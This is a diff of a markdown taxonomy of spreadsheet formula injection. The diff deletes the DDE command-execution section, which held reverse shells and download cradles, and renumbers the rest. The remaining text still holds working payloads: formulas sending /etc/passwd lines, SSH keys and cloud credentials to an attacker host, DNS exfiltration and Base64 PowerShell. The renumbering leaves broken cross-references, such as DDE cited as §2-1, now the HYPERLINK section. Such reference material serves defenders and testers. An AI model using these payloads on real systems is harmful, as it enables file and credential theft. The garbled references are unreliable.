@@ -4,9 +4,9 @@
 
 ## Classification Structure
 
-CSV/Formula Injection exploits a fundamental design flaw in spreadsheet file formats: **the absence of separation between data and executable code**. When an application exports user-controlled input into a CSV, TSV, or spreadsheet file (XLSX, ODS) without neutralization, and that file is subsequently opened in a spreadsheet application, any cell beginning with certain trigger characters is interpreted as a formula rather than a literal string. This taxonomy organizes the entire attack surface into eight structural categories based on **what component of the injection chain is being mutated**.
+CSV/Formula Injection exploits a fundamental design flaw in spreadsheet file formats: **the absence of separation between data and executable code**. When an application exports user-controlled input into a CSV, TSV, or spreadsheet file (XLSX, ODS) without neutralization, and that file is subsequently opened in a spreadsheet application, any cell beginning with certain trigger characters is interpreted as a formula rather than a literal string. This taxonomy organizes the entire attack surface into seven structural categories based on **what component of the injection chain is being mutated**.
 
-**Axis 1 (Primary — Mutation Target)** structures the document by the specific element being exploited: trigger syntax, execution primitive, exfiltration channel, resource access method, obfuscation technique, application-specific behavior, server-side evaluation context, or document-level structure.
+**Axis 1 (Primary — Mutation Target)** structures the document by the specific element being exploited: trigger syntax, exfiltration channel, resource access method, obfuscation technique, application-specific behavior, server-side evaluation context, or document-level structure.
 
 **Axis 2 (Cross-cutting — Interaction Requirement)** classifies each subtype by the degree of victim interaction required:
 
@@ -58,53 +58,11 @@ Formulas can be initiated through character sequences that individually appear h
 
 ---
 
-## §2. Command Execution via Interprocess Communication
-
-Once a formula trigger is activated, the most dangerous escalation path is arbitrary command execution on the victim's operating system. This is achieved through Windows interprocess communication protocols embedded within spreadsheet formula syntax.
-
-### §2-1. Dynamic Data Exchange (DDE) — Direct Command Invocation
-
-DDE is a legacy Windows IPC protocol that allows applications to exchange data and invoke commands on each other. Spreadsheet applications historically supported DDE within formulas, enabling direct OS command execution.
-
-| Subtype | Mechanism | Key Condition |
-|---|---|---|
-| **Basic DDE call** | `=DDE("cmd";"/C calc";"!A0")` — the DDE function takes three arguments: application name, command/topic, and item reference. The target application (`cmd`) is launched with the specified arguments. | DDE must be enabled in Trust Center settings. Office 2021+ and Microsoft 365 disable DDE by default. |
-| **Pipe-syntax DDE** | `=cmd\|'/C calc'!A0` — uses the pipe (`\|`) operator as a shorthand DDE invocation where the program name precedes the pipe, arguments follow in quotes, and the cell reference terminates the expression. | Same DDE enablement requirement. This is the most commonly observed payload format. |
-| **cmd.exe wrapper** | `=cmd\|'/C powershell IEX(New-Object Net.WebClient).DownloadString("http://attacker.com/shell.ps1")'!A0` — wraps PowerShell invocation inside cmd.exe to download and execute remote payloads. | DDE enabled + network egress from victim host. |
-| **rundll32 DDE** | `=rundll32\|'URL.dll,OpenURL calc.exe'!A` — invokes `rundll32.exe` with `URL.dll` to open arbitrary files or URLs, bypassing direct cmd.exe invocation. | DDE enabled. Exploits the 8-character executable name used for suffix obfuscation (§5-2). |
-| **PowerShell cradle** | `=cmd\|'/C powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX(...)"'!A0` — fully-featured PowerShell download cradle with execution policy bypass and hidden window. | DDE enabled + PowerShell available. Common in post-exploitation chains targeting corporate environments. |
-| **Reverse shell** | `=cmd\|'/C powershell Invoke-WebRequest "http://attacker/shell.ps1" -OutFile "$env:Temp\shell.ps1"; powershell -ExecutionPolicy Bypass -File "$env:Temp\shell.ps1"'!A1` — two-stage: downloads reverse shell script to temp, then executes with bypassed policy. | DDE enabled + outbound connectivity + PowerShell. |
-| **Netcat shell** | `=cmd\|"/C nc -e cmd.exe attacker.com 4444"!'A0'` — direct netcat reverse shell if nc.exe is present on the victim system. | DDE enabled + netcat installed (uncommon on corporate systems). |
-| **certutil download** | Uses `certutil -urlcache -split -f http://attacker/payload.exe %TEMP%\payload.exe` within DDE to leverage the Windows certificate utility as a download primitive, bypassing application whitelisting that blocks PowerShell. | DDE enabled + certutil available (present by default on Windows). |
-| **File manipulation** | `=cmd\|'/C powershell Set-Content "C:\\Users\\Victim\\Desktop\\file.txt" "Malicious Content"'!'A0'` — writes arbitrary content to arbitrary file paths on the victim system. | DDE enabled. Enables data destruction or planting of configuration changes. |
-
-### §2-2. DDE Security Model & Warning Chain
-
-Modern spreadsheet applications impose a multi-step warning process before DDE execution. Understanding this chain reveals why social engineering remains a viable path.
-
-| Step | Warning | Bypass Consideration |
-|---|---|---|
-| **1. External content warning** | "This workbook contains links to other data sources" | Generic message; users habituated to clicking "Enable" |
-| **2. DDE-specific warning** | "Excel is starting application [cmd]" | Shows the application name but not the full command; appears harmless if the application name is obscured |
-| **3. Trust Center setting** | DDE must be enabled under File → Options → Trust Center → External Content | Disabled by default in Office 2021+/365; enabled by default in older versions |
-
-In older Office versions (pre-2021), only warnings 1 and 2 appear, and DDE is enabled by default, requiring only two clicks from the victim.
-
-### §2-3. Non-DDE Command Execution Paths
-
-| Subtype | Mechanism | Key Condition |
-|---|---|---|
-| **VBA macro injection** | If the output format supports macros (XLSM, XLSB), injected content can include or trigger VBA code execution. This is distinct from formula injection but may be chained when an application exports to macro-enabled formats. | Macro execution must be enabled by the user. Not applicable to CSV/plain XLSX. |
-| **OLE object embedding** | Object Linking & Embedding allows executable files to be embedded within Office documents. When activated, the embedded payload executes directly. Unlike macros that fetch remote payloads, OLE payloads are self-contained within the document. | Requires XLSX/ODS format (not CSV). User must double-click the embedded object. |
-| **Remote template injection** | OOXML documents (XLSX) can reference external template files via relationships. When the document loads, Excel fetches the remote template, which may contain malicious macros or content. | Requires XLSX format with manipulated `_rels` directory. Fetches on open without explicit user consent in some versions. |
-
----
-
-## §3. Network-Based Data Exfiltration
+## §2. Network-Based Data Exfiltration
 
 Data exfiltration formulas extract information from the spreadsheet (or from the victim's system) and transmit it to an attacker-controlled server over network channels. The critical differentiator between subtypes is the **interaction requirement**: some execute automatically on file open, while others require a click.
 
-### §3-1. HYPERLINK-Based Exfiltration (Click-Triggered)
+### §2-1. HYPERLINK-Based Exfiltration (Click-Triggered)
 
 The `HYPERLINK` function creates a clickable link within a cell. When the link URL is dynamically constructed to include data from other cells, clicking it transmits that data to the attacker's server.
 
@@ -116,7 +74,7 @@ The `HYPERLINK` function creates a clickable link within a cell. When the link U
 
 **Key advantage**: HYPERLINK does not trigger Excel's external content warning dialogs. The exfiltration appears as a normal hyperlink click, making it significantly stealthier than DDE-based attacks.
 
-### §3-2. WEBSERVICE-Based Exfiltration (Auto-Execute)
+### §2-2. WEBSERVICE-Based Exfiltration (Auto-Execute)
 
 The `WEBSERVICE` function (available in Excel 2013+, Windows only) makes an HTTP GET request to a specified URL and returns the response body as the cell value. Critically, **it executes automatically when the spreadsheet is opened or recalculated**, requiring no click beyond opening the file.
 
@@ -129,7 +87,7 @@ The `WEBSERVICE` function (available in Excel 2013+, Windows only) makes an HTTP
 
 **Limitations**: WEBSERVICE only supports HTTP/HTTPS protocols (no `file://`, `smb://`, or other schemes). NULL bytes in data terminate the URL string, preventing binary data exfiltration. Certain ports are blocked.
 
-### §3-3. WEBSERVICE + FILTERXML Chain (Structured Extraction)
+### §2-3. WEBSERVICE + FILTERXML Chain (Structured Extraction)
 
 `FILTERXML` (Excel 2013+) parses XML using XPath expressions, enabling targeted extraction from XML/HTML responses obtained via WEBSERVICE.
 
@@ -138,7 +96,7 @@ The `WEBSERVICE` function (available in Excel 2013+, Windows only) makes an HTTP
 | **XPath extraction** | `=FILTERXML(WEBSERVICE("http://target/api.xml"), "//secret/text()")` — fetches an XML document and extracts specific nodes using XPath, allowing precise data targeting from structured API responses. | Excel 2013+. Target must return well-formed XML. |
 | **Selective SSRF** | Combines WEBSERVICE to reach internal XML-based services with FILTERXML to extract only the sensitive fields (credentials, tokens, configuration values) from verbose API responses. | Internal service must return XML. Enables surgical data extraction. |
 
-### §3-4. DNS-Based Out-of-Band Exfiltration
+### §2-4. DNS-Based Out-of-Band Exfiltration
 
 When HTTP egress is filtered, DNS queries offer an alternative exfiltration channel since DNS traffic is rarely blocked.
 
@@ -147,7 +105,7 @@ When HTTP egress is filtered, DNS queries offer an alternative exfiltration chan
 | **DNS via WEBSERVICE** | `=WEBSERVICE(CONCATENATE((SUBSTITUTE(MID((ENCODEURL('file:///etc/passwd'#$passwd.A19)),1,41),"%","-")),".<attacker-domain>"))` — constructs a hostname from file content: `MID` extracts character ranges, `ENCODEURL` handles special characters, `SUBSTITUTE` replaces `%` with `-` for DNS compatibility, and the final string becomes a DNS lookup to `<encoded-data>.attacker.com`. | LibreOffice (supports `file://` protocol for local file access). Attacker must control an authoritative DNS server to capture queries. |
 | **Segmented extraction** | Multiple formulas in different cells each extract different character ranges (positions 1-41, 42-82, etc.) using `MID`, enabling full file extraction through parallel DNS queries with sequential subdomain labels. | Same as above. Requires multiple cells or iterative extraction. Limited to ~41 characters per DNS label. |
 
-### §3-5. Google Sheets Import Functions (Auto-Execute)
+### §2-5. Google Sheets Import Functions (Auto-Execute)
 
 Google Sheets provides a family of `IMPORT*` functions designed for legitimate data aggregation. Each makes outbound requests to specified URLs and can be weaponized for exfiltration by embedding stolen data in the request URL.
 
@@ -162,11 +120,11 @@ Google Sheets provides a family of `IMPORT*` functions designed for legitimate d
 
 ---
 
-## §4. Local Resource Access
+## §3. Local Resource Access
 
 Beyond network exfiltration, certain spreadsheet applications allow formulas to read local files or access system information directly, without making outbound network requests.
 
-### §4-1. LibreOffice File Protocol Access
+### §3-1. LibreOffice File Protocol Access
 
 LibreOffice Calc supports the `file://` protocol scheme within cell references, enabling direct reading of local files on the victim's filesystem.
 
@@ -174,10 +132,10 @@ LibreOffice Calc supports the `file://` protocol scheme within cell references, 
 |---|---|---|
 | **Direct file read** | `='file:///etc/passwd'#$passwd.A1` — reads the first line of `/etc/passwd` by referencing it as an external spreadsheet. The `#$passwd` fragment specifies the sheet name, and `.A1` specifies the cell containing the first line. | LibreOffice Calc on Linux/macOS. The file must be readable by the user running LibreOffice. |
 | **Multi-line extraction** | Chain references: `='file:///etc/passwd'#$passwd.A1` in cell B1, `='file:///etc/passwd'#$passwd.A2` in cell B2, etc. Each reference extracts a successive line from the target file. | Same conditions. Requires one formula per line. |
-| **Combined read + exfiltrate** | `=WEBSERVICE(CONCATENATE("http://attacker.com/",('file:///etc/passwd'#$passwd.A1)))` — reads a local file line and immediately transmits it to the attacker's server via WEBSERVICE. Combines §4-1 with §3-2 for a single-formula read-and-exfiltrate chain. | LibreOffice Calc with WEBSERVICE support. |
+| **Combined read + exfiltrate** | `=WEBSERVICE(CONCATENATE("http://attacker.com/",('file:///etc/passwd'#$passwd.A1)))` — reads a local file line and immediately transmits it to the attacker's server via WEBSERVICE. Combines §3-1 with §2-2 for a single-formula read-and-exfiltrate chain. | LibreOffice Calc with WEBSERVICE support. |
 | **Configuration theft** | Target sensitive configuration files: `='file:///home/user/.ssh/id_rsa'#$id_rsa.A1` or `='file:///home/user/.aws/credentials'#$credentials.A1` — extracts SSH private keys or cloud credentials. | LibreOffice Calc. Files must contain line-delimited text data. |
 
-### §4-2. Internal Service Probing via WEBSERVICE
+### §3-2. Internal Service Probing via WEBSERVICE
 
 When WEBSERVICE is combined with internal network targets rather than attacker-controlled servers, it becomes a **client-side SSRF** probe.
 
@@ -189,11 +147,11 @@ When WEBSERVICE is combined with internal network targets rather than attacker-c
 
 ---
 
-## §5. Payload Obfuscation & Filter Evasion
+## §4. Payload Obfuscation & Filter Evasion
 
 Once an injection vector is identified, attackers must evade sanitization filters, WAFs, and antivirus engines that scan for known payload patterns. Obfuscation techniques modify the syntactic appearance of payloads without altering their execution semantics.
 
-### §5-1. Prefix Obfuscation
+### §4-1. Prefix Obfuscation
 
 Arbitrary expressions can be prepended before the malicious command. The spreadsheet engine evaluates the entire expression chain, and the DDE invocation fires regardless of preceding arithmetic.
 
@@ -203,16 +161,7 @@ Arbitrary expressions can be prepended before the malicious command. The spreads
 | **Function prefix** | `+thespanishinquisition(cmd\|'/c calc.exe'!A` — prefixes the DDE call with a nonexistent function name. The function call fails silently, but the DDE invocation still triggers. | DDE enabled. The function name is arbitrary. |
 | **Legitimate formula prefix** | `=1+1+cmd\|'/C calc'!A0` — prepends a valid arithmetic expression so that signature-based filters looking for `=cmd` patterns fail to match. | DDE enabled. Common bypass for naive string-matching filters. |
 
-### §5-2. Suffix Obfuscation
-
-Exploits the DOS-era 8.3 filename convention: Windows executable names are matched on the first 8 characters, with additional characters ignored.
-
-| Subtype | Mechanism | Key Condition |
-|---|---|---|
-| **Extended executable name** | `=rundll321234567890abcdefghijklmnopqrstuvwxyz\|'URL.dll,OpenURL calc.exe'!A` — `rundll32` is matched despite the trailing garbage characters because Windows resolves the first 8 characters of the executable name. | DDE enabled on Windows. Only works with executables whose canonical name is ≤8 characters. |
-| **Regsvr32 variant** | Similar padding applied to `regsvr32`, `certutil`, or other system utilities with short canonical names. | Same 8-character matching behavior. |
-
-### §5-3. Infix Obfuscation
+### §4-2. Infix Obfuscation
 
 Characters inserted within the payload body that are stripped during execution.
 
@@ -222,23 +171,14 @@ Characters inserted within the payload body that are stripped during execution.
 | **Whitespace injection** | `=    C    m D \|'/c calc.exe'!A` — spaces inserted between characters of the command name. Spaces are ignored in certain positions (before the command, between arguments) but split the command if placed within the executable name in some contexts. | DDE enabled. Less reliable than null bytes; behavior varies by parser. |
 | **Case randomization** | `=CmD\|'/c calc'!A`, `=CMD\|'/c calc'!A`, `=cMd\|'/c calc'!A` — command names are case-insensitive on Windows, allowing arbitrary case variations to evade case-sensitive signature matching. | DDE enabled on Windows. Trivial bypass for case-sensitive pattern matching. |
 
-### §5-4. Expression Chaining
-
-Multiple DDE invocations can be linked through arithmetic operators, causing redundant execution.
-
-| Subtype | Mechanism | Key Condition |
-|---|---|---|
-| **Multiplication chain** | `=cmd\|'/c calc.exe'!A*cmd\|'/c calc.exe'!A` — the multiplication operator links two DDE calls. Both execute during expression evaluation. | DDE enabled. May trigger the command twice. |
-| **Mixed operator chain** | Combining `+`, `-`, `*`, `/`, `&` operators between DDE invocations creates complex expression trees that obscure the payload in static analysis. | DDE enabled. Operators have no meaningful arithmetic effect on DDE results. |
-
-### §5-5. Encoding-Level Bypass
+### §4-3. Encoding-Level Bypass
 
 | Subtype | Mechanism | Key Condition |
 |---|---|---|
 | **Base64-encoded PowerShell** | `=cmd\|'/C powershell IEX([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("...")))'!A0` — the actual malicious command is Base64-encoded within the PowerShell invocation, bypassing content-based filters that scan for keywords like `Invoke-WebRequest` or `DownloadString`. | DDE enabled + PowerShell. Encoded payload avoids string-matching detection. |
-| **UTF-7 encoding bypass** | In server-side scenarios, XXE payloads can be UTF-7 encoded to bypass XML encoding validation that only checks for UTF-8/UTF-16 signatures (see §7-2). The regex checking for encoding attribute can be defeated by adding whitespace around the `=` character. | Server-side XLSX processing with PhpSpreadsheet or similar libraries. |
+| **UTF-7 encoding bypass** | In server-side scenarios, XXE payloads can be UTF-7 encoded to bypass XML encoding validation that only checks for UTF-8/UTF-16 signatures (see §6-2). The regex checking for encoding attribute can be defeated by adding whitespace around the `=` character. | Server-side XLSX processing with PhpSpreadsheet or similar libraries. |
 
-### §5-6. Sanitization-Specific Bypasses
+### §4-4. Sanitization-Specific Bypasses
 
 These target specific defense implementations rather than generic detection.
 
@@ -251,70 +191,56 @@ These target specific defense implementations rather than generic detection.
 
 ---
 
-## §6. Application-Specific Attack Surfaces
+## §5. Application-Specific Attack Surfaces
 
 Different spreadsheet applications support different formula functions, have different security models, and present different attack surfaces. This section maps the exploitability matrix across major applications.
 
-### §6-1. Microsoft Excel (Windows)
+### §5-1. Microsoft Excel (Windows)
 
 The most feature-rich and most targeted application. Attack surface includes DDE, WEBSERVICE, FILTERXML, HYPERLINK, and external data connections.
 
 | Feature | Attack Relevance | Version Notes |
 |---|---|---|
 | **DDE** | Full OS command execution (§2-1) | Disabled by default in Office 2021+/365. Enabled by default in older versions. |
-| **WEBSERVICE** | Auto-execute HTTP requests, client-side SSRF (§3-2) | Available since Excel 2013. Windows only. |
-| **FILTERXML** | Structured XML extraction from WEBSERVICE responses (§3-3) | Available since Excel 2013. Windows only. |
-| **HYPERLINK** | Click-triggered data exfiltration (§3-1) | All versions. No security prompt. |
-| **ENCODEURL** | URL encoding for exfiltration payloads (§3-2) | Available since Excel 2013. |
+| **WEBSERVICE** | Auto-execute HTTP requests, client-side SSRF (§2-2) | Available since Excel 2013. Windows only. |
+| **FILTERXML** | Structured XML extraction from WEBSERVICE responses (§2-3) | Available since Excel 2013. Windows only. |
+| **HYPERLINK** | Click-triggered data exfiltration (§2-1) | All versions. No security prompt. |
+| **ENCODEURL** | URL encoding for exfiltration payloads (§2-2) | Available since Excel 2013. |
 | **Power Query** | External data connections that fetch remote data on open | Can be configured to auto-refresh. Enterprise environments may have this enabled. |
 | **MSHTML engine** | ActiveX controls rendered within Office documents (CVE-2021-40444) | Exploitable for RCE through crafted documents. Patched but relevant for understanding attack surface. |
 
-### §6-2. LibreOffice Calc
+### §5-2. LibreOffice Calc
 
 Supports file protocol access and WEBSERVICE, making it the most dangerous application for local file exfiltration chains.
 
 | Feature | Attack Relevance | Notes |
 |---|---|---|
-| **file:// protocol** | Direct local file reading (§4-1) | Unique to LibreOffice. Enables `/etc/passwd`, SSH keys, cloud credential extraction. |
-| **WEBSERVICE** | HTTP exfiltration (§3-2) | Available in LibreOffice. Combines with file:// for read-and-exfiltrate chains. |
+| **file:// protocol** | Direct local file reading (§3-1) | Unique to LibreOffice. Enables `/etc/passwd`, SSH keys, cloud credential extraction. |
+| **WEBSERVICE** | HTTP exfiltration (§2-2) | Available in LibreOffice. Combines with file:// for read-and-exfiltrate chains. |
 | **DDE** | Command execution | Supported as a legacy IPC protocol on Windows. |
 | **Macro execution** | VBA-compatible macros in ODS/XLSX files | Requires user enablement. |
 
-### §6-3. Google Sheets
+### §5-3. Google Sheets
 
 No DDE or local file access, but the `IMPORT*` function family provides powerful auto-executing network exfiltration capabilities.
 
 | Feature | Attack Relevance | Notes |
 |---|---|---|
-| **IMPORTXML** | OOB data exfiltration (§3-5) | Authorization prompt displayed but request fires on approval. |
-| **IMPORTHTML** | OOB exfiltration disguised as HTML import (§3-5) | Same authorization prompt. |
-| **IMPORTFEED** | OOB exfiltration via RSS/Atom request (§3-5) | Same authorization prompt. |
-| **IMPORTDATA** | Live-streaming exfiltration (§3-5) | Re-evaluates on cell changes, enabling continuous data monitoring. |
-| **IMPORTRANGE** | Cross-spreadsheet data access (§3-5) | Requires target spreadsheet sharing permission. |
-| **IMAGE** | Silent tracking pixel exfiltration (§3-5) | Image load occurs automatically. |
+| **IMPORTXML** | OOB data exfiltration (§2-5) | Authorization prompt displayed but request fires on approval. |
+| **IMPORTHTML** | OOB exfiltration disguised as HTML import (§2-5) | Same authorization prompt. |
+| **IMPORTFEED** | OOB exfiltration via RSS/Atom request (§2-5) | Same authorization prompt. |
+| **IMPORTDATA** | Live-streaming exfiltration (§2-5) | Re-evaluates on cell changes, enabling continuous data monitoring. |
+| **IMPORTRANGE** | Cross-spreadsheet data access (§2-5) | Requires target spreadsheet sharing permission. |
+| **IMAGE** | Silent tracking pixel exfiltration (§2-5) | Image load occurs automatically. |
 | **CSV import bypass** | Google Sheets' sanitization (apostrophe prefix) applied to Google Forms responses is **not** applied when importing CSV files directly, leaving formulas active. | Inconsistent sanitization between input channels. |
-
-### §6-4. Apache OpenOffice
-
-| Feature | Attack Relevance | Notes |
-|---|---|---|
-| **DDE** | Command execution on Windows | Similar behavior to LibreOffice. |
-| **Formula evaluation** | Standard formula processing | Shares codebase ancestry with LibreOffice but may differ in specific function support. |
-
-### §6-5. Apple Numbers
-
-| Feature | Attack Relevance | Notes |
-|---|---|---|
-| **Limited formula set** | Numbers supports a restricted formula set without DDE, WEBSERVICE, or file:// protocol | Significantly reduced attack surface compared to Excel/LibreOffice. |
-| **No DDE** | No command execution path through formulas | macOS does not support the DDE protocol. |
 
 ---
 
-## §7. Server-Side Spreadsheet Injection (SSSI)
+## §6. Server-Side Spreadsheet Injection (SSSI)
 
 A distinct and increasingly important attack class where **the server — not the user — evaluates injected formulas**. This inverts the traditional threat model: instead of targeting a human victim who opens a file, the attacker targets automated server-side processing of spreadsheet uploads.
 
-### §7-1. Server-Side Formula Evaluation
+### §6-1. Server-Side Formula Evaluation
 
 | Subtype | Mechanism | Key Condition |
 |---|---|---|
@@ -323,7 +249,7 @@ A distinct and increasingly important attack class where **the server — not th
 | **Real-time evaluation** | G-Suite integrated applications that export user data to Google Sheets may trigger formula re-evaluation whenever the sheet is accessed by an administrator. Injected `IMPORTDATA` formulas provide continuous streaming of updated data to the attacker. | G-Suite/Google Sheets integration with auto-refresh. |
 | **Cloud metadata via SSSI** | When server-side conversion runs on a cloud instance (EC2, GCE, Azure VM), injected formulas can access instance metadata endpoints (`http://169.254.169.254/...`), exfiltrating IAM credentials, instance identity documents, and environment variables. Post-exploitation of stolen cloud credentials can escalate to full infrastructure compromise. | Server runs on a cloud instance with accessible metadata service. |
 
-### §7-2. XML External Entity (XXE) via Spreadsheet Libraries
+### §6-2. XML External Entity (XXE) via Spreadsheet Libraries
 
 XLSX files are ZIP archives containing XML documents. Server-side libraries that parse XLSX files may be vulnerable to XXE injection through malicious XML content embedded within the spreadsheet.
 
@@ -334,7 +260,7 @@ XLSX files are ZIP archives containing XML documents. Server-side libraries that
 | **openpyxl XXE** | openpyxl (Python) | XML parser processes external entities in uploaded XLSX files, enabling file read and SSRF from the server. | CVE-2017-5992 |
 | **General pattern** | Any library parsing XLSX/ODS XML without disabling DTD processing | The fundamental vulnerability is that XLSX is XML-based, and default XML parser configurations in many languages enable external entity resolution. | — |
 
-### §7-3. Server-Side Injection via Log Files
+### §6-3. Server-Side Injection via Log Files
 
 | Subtype | Mechanism | Key Condition |
 |---|---|---|
@@ -344,11 +270,11 @@ XLSX files are ZIP archives containing XML documents. Server-side libraries that
 
 ---
 
-## §8. Delivery Format & Parser Exploitation
+## §7. Delivery Format & Parser Exploitation
 
 The file format used to deliver the injected payload affects which techniques are available, how parsing occurs, and what sanitization is applied.
 
-### §8-1. CSV (Comma-Separated Values)
+### §7-1. CSV (Comma-Separated Values)
 
 | Subtype | Mechanism | Key Condition |
 |---|---|---|
@@ -357,13 +283,13 @@ The file format used to deliver the injected payload affects which techniques ar
 | **Field separator confusion** | Injecting commas or semicolons within a quoted field to manipulate column alignment, causing the formula to appear in a different column than expected by sanitization logic. | Affects applications that sanitize specific columns (e.g., "only sanitize the name column") rather than all fields. |
 | **Multi-line field injection** | `"normal\n=cmd\|'/C calc'!A0"` — a newline within a quoted CSV field creates a new row in the spreadsheet, where the formula begins on a fresh line with a trigger character. | Parser must support multi-line quoted fields per RFC 4180. |
 
-### §8-2. TSV (Tab-Separated Values)
+### §7-2. TSV (Tab-Separated Values)
 
 | Subtype | Mechanism | Key Condition |
 |---|---|---|
 | **Tab as sanitization conflict** | When tab (`0x09`) is used as both the field delimiter (TSV) and the sanitization prefix, the defense mechanism conflicts with the format structure. | Applications that export TSV and use tab-prefix sanitization simultaneously. |
 
-### §8-3. XLSX / ODS (XML-Based Spreadsheet Formats)
+### §7-3. XLSX / ODS (XML-Based Spreadsheet Formats)
 
 | Subtype | Mechanism | Key Condition |
 |---|---|---|
@@ -377,19 +303,19 @@ The file format used to deliver the injected payload affects which techniques ar
 
 | Scenario | Architecture | Primary Mutation Categories | Interaction |
 |---|---|---|---|
-| **Client-side RCE** | User opens exported CSV/XLSX in Excel/LibreOffice on Windows | §1 + §2-1 (DDE) + §5 (obfuscation) | Multi-step (DDE warnings) |
-| **Client-side data theft** | User opens exported file; formulas auto-exfiltrate | §1 + §3-2 (WEBSERVICE) or §3-5 (IMPORT*) | Auto-execute or click |
-| **Client-side SSRF** | Victim on internal network; WEBSERVICE probes internal services | §1 + §3-2 + §4-2 | Auto-execute |
-| **Client-side file read** | Victim opens CSV in LibreOffice; local files extracted | §1 + §4-1 + §3-4 (DNS exfil) | Auto-execute |
-| **Server-side RCE** | Application processes uploaded XLSX server-side | §7-1 + §2-1 (if DDE enabled on server) | None (automated) |
-| **Server-side XXE** | XLSX upload parsed by vulnerable library | §7-2 | None (automated) |
-| **Server-side SSRF** | Server evaluates WEBSERVICE formula during conversion | §7-1 + §3-2 + §4-2 (metadata) | None (automated) |
-| **Cloud credential theft** | SSSI on cloud instance → metadata → IAM credentials | §7-1 + §4-2 | None (automated) |
-| **Log poisoning chain** | Attacker poisons logs → admin exports CSV → formula fires | §7-3 + §1 + §2/§3 | Indirect (admin opens export) |
-| **Cross-tenant data leak** | Google Sheets IMPORTRANGE across organizational boundaries | §3-5 (IMPORTRANGE) | Authorization prompt |
-| **Phishing via spreadsheet** | HYPERLINK formula disguised as legitimate link | §3-1 + social engineering | Click |
-| **Supply chain** | Vulnerable CSV library ships without sanitization | §7-2, §8-3 | Depends on consumer |
-| **Financial transaction manipulation** | Delimiter injection in financial messaging fields alters transaction parameters | §7-3 (Financial messaging) | None (server-side) |
+| **Client-side RCE** | User opens exported CSV/XLSX in Excel/LibreOffice on Windows | §1 + §2-1 (DDE) + §4 (obfuscation) | Multi-step (DDE warnings) |
+| **Client-side data theft** | User opens exported file; formulas auto-exfiltrate | §1 + §2-2 (WEBSERVICE) or §2-5 (IMPORT*) | Auto-execute or click |
+| **Client-side SSRF** | Victim on internal network; WEBSERVICE probes internal services | §1 + §2-2 + §3-2 | Auto-execute |
+| **Client-side file read** | Victim opens CSV in LibreOffice; local files extracted | §1 + §3-1 + §2-4 (DNS exfil) | Auto-execute |
+| **Server-side RCE** | Application processes uploaded XLSX server-side | §6-1 + §2-1 (if DDE enabled on server) | None (automated) |
+| **Server-side XXE** | XLSX upload parsed by vulnerable library | §6-2 | None (automated) |
+| **Server-side SSRF** | Server evaluates WEBSERVICE formula during conversion | §6-1 + §2-2 + §3-2 (metadata) | None (automated) |
+| **Cloud credential theft** | SSSI on cloud instance → metadata → IAM credentials | §6-1 + §3-2 | None (automated) |
+| **Log poisoning chain** | Attacker poisons logs → admin exports CSV → formula fires | §6-3 + §1 + §2/§2 | Indirect (admin opens export) |
+| **Cross-tenant data leak** | Google Sheets IMPORTRANGE across organizational boundaries | §2-5 (IMPORTRANGE) | Authorization prompt |
+| **Phishing via spreadsheet** | HYPERLINK formula disguised as legitimate link | §2-1 + social engineering | Click |
+| **Supply chain** | Vulnerable CSV library ships without sanitization | §6-2, §7-3 | Depends on consumer |
+| **Financial transaction manipulation** | Delimiter injection in financial messaging fields alters transaction parameters | §6-3 (Financial messaging) | None (server-side) |
 
 ---
 
@@ -403,17 +329,17 @@ The file format used to deliver the injected payload affects which techniques ar
 | §1-1 + basic formula | CVE-2025-62417 | Bagisto (Create New Product) | CSV formula injection due to lack of input validation on product attributes |
 | §1-1 + §2-1 | CVE-2024-24337 | Koha Library Management v23.05.05 | DDE injection via Budget and Patrons Member CSV exports |
 | §1-1 + basic formula | CVE-2024-28111 | (Application) | Formula injection in CSV export |
-| §1-1 + §3 (exfiltration) | CVE-2024-29381 | Medplum | CSV/formula injection enabling data exfiltration when admin exports |
-| §7-2 (XXE) | CVE-2024-45293 | PhpSpreadsheet (XLSX reader) | XXE via encoding bypass in XML scanner; server-side file read & SSRF |
-| §7-2 (XXE) | CVE-2024-45084 | IBM Cognos Controller 11.0.0–11.1.0 | Formula injection (CWE-1236) in enterprise reporting platform |
+| §1-1 + §2 (exfiltration) | CVE-2024-29381 | Medplum | CSV/formula injection enabling data exfiltration when admin exports |
+| §6-2 (XXE) | CVE-2024-45293 | PhpSpreadsheet (XLSX reader) | XXE via encoding bypass in XML scanner; server-side file read & SSRF |
+| §6-2 (XXE) | CVE-2024-45084 | IBM Cognos Controller 11.0.0–11.1.0 | Formula injection (CWE-1236) in enterprise reporting platform |
 | §1-1 + basic formula | CVE-2025-13133 | WordPress Simple User Import Export ≤1.1.7 | Formula injection in user import/export plugin |
-| §7-2 (XXE) | CVE-2018-19277 | PhpSpreadsheet | XXE injection in XLSX parsing |
-| §7-2 (XXE) | CVE-2017-5992 | openpyxl (Python) | XXE in XLSX parsing |
-| §7-3 (Log poisoning) | — (Vectra research) | Microsoft Azure Logs | Formula injection via sign-in log poisoning; no authentication required |
-| §7-1 (SSSI) | — (Bishop Fox) | G-Suite integrated application | Live-streaming data exfiltration + DDE-based RCE on cloud instance |
-| §3-1 + §3-2 | HackerOne #1748961 | Consensys (MetaMask) | CSV injection in export functionality |
-| §3-2 (WEBSERVICE SSRF) | — (Bug bounty writeup) | Undisclosed | CSV injection → client-side SSRF → AWS IAM credential exfiltration |
-| §7-3 (Financial messaging) | — (Omar El Shopky, 2025) | Temenos T24 (OFS) | Field delimiter injection in OFS messages overwrites transaction fields; generalizable to financial middleware using delimited message formats |
+| §6-2 (XXE) | CVE-2018-19277 | PhpSpreadsheet | XXE injection in XLSX parsing |
+| §6-2 (XXE) | CVE-2017-5992 | openpyxl (Python) | XXE in XLSX parsing |
+| §6-3 (Log poisoning) | — (Vectra research) | Microsoft Azure Logs | Formula injection via sign-in log poisoning; no authentication required |
+| §6-1 (SSSI) | — (Bishop Fox) | G-Suite integrated application | Live-streaming data exfiltration + DDE-based RCE on cloud instance |
+| §2-1 + §2-2 | HackerOne #1748961 | Consensys (MetaMask) | CSV injection in export functionality |
+| §2-2 (WEBSERVICE SSRF) | — (Bug bounty writeup) | Undisclosed | CSV injection → client-side SSRF → AWS IAM credential exfiltration |
+| §6-3 (Financial messaging) | — (Omar El Shopky, 2025) | Temenos T24 (OFS) | Field delimiter injection in OFS messages overwrites transaction fields; generalizable to financial middleware using delimited message formats |
 
 ---
 
